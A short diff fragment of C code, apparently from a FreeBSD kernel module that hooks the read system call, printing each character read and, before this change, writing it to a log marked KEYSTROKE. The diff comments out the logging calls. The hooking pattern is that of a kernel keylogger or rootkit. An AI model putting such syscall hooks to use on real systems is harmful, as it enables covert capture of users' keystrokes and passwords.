@@ -199,15 +199,11 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 
 	printf("%c", buf[0]);
 
-	int testfd = 0;
+	// int testfd = 0;
 
-	filewriter_openlog(curthread, &testfd, KEYSTROKE);
+	// filewriter_openlog(curthread, &testfd, KEYSTROKE);
 	
-	filewriter_closelog(curthread, testfd);	
-
-	
-	
-
+	// filewriter_closelog(curthread, testfd);	
 
 	
 
